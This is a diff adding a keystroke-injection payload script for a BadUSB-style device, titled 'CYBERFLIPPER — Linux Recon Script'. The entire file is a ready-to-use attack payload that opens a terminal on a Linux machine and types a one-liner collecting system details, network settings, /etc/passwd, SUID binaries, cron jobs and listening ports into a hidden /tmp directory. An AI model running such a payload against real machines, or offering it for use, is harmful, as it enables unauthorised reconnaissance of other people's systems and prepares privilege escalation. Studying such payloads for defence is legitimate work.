@@ -1,0 +1,14 @@
+REM ==============================================
+REM CYBERFLIPPER — Linux Recon Script
+REM Comprehensive Linux system enumeration
+REM Inspired by Hak5 Bash Bunny payloads
+REM ==============================================
+REM TARGET: Linux (Ubuntu/Debian/Kali)
+REM AUTHOR: @CYBERFLIPPER / FLLC
+
+DELAY 2000
+CTRL ALT t
+DELAY 1000
+STRING mkdir -p /tmp/.cyber_audit && cd /tmp/.cyber_audit && echo "=== CYBERFLIPPER LINUX AUDIT ===" > audit.txt && echo "Date: $(date)" >> audit.txt && echo "" >> audit.txt && echo "=== SYSTEM INFO ===" >> audit.txt && uname -a >> audit.txt && echo "" >> audit.txt && cat /etc/os-release >> audit.txt && echo "" >> audit.txt && echo "=== NETWORK ===" >> audit.txt && ip a >> audit.txt && echo "" >> audit.txt && ip route >> audit.txt && echo "" >> audit.txt && cat /etc/resolv.conf >> audit.txt && echo "" >> audit.txt && echo "=== USERS ===" >> audit.txt && cat /etc/passwd >> audit.txt && echo "" >> audit.txt && echo "=== SUID BINARIES ===" >> audit.txt && find / -perm -4000 2>/dev/null >> audit.txt && echo "" >> audit.txt && echo "=== CRON ===" >> audit.txt && crontab -l 2>/dev/null >> audit.txt && echo "" >> audit.txt && echo "=== LISTENING PORTS ===" >> audit.txt && ss -tulpn >> audit.txt && echo "Audit complete: /tmp/.cyber_audit/audit.txt"
+ENTER
+DELAY 5000
